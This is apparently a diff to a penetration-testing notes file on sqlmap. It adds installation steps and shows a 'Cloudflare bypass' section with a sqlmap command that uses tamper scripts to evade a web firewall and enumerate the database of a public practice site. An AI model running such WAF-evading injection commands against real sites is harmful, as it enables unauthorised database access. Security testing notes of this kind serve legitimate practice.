@@ -1,5 +1,10 @@
-<h1>SQLmap</h1>
-
+### Installtion
+```
+cd /opt/ && sudo git clone https://github.com/sqlmapproject/sqlmap.git
+cd
+sudo ln -sf /opt/sqlmap/sqlmap.py /usr/local/bin/sqlmap
+sqlmap -h
+```
 ### Cloudflare bypass tamper=space2comment,between,randomcase
 ```
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1*" --batch --random-agent --risk=3 --level=5 --current-db --tamper=space2comment,between,randomcase --no-cast
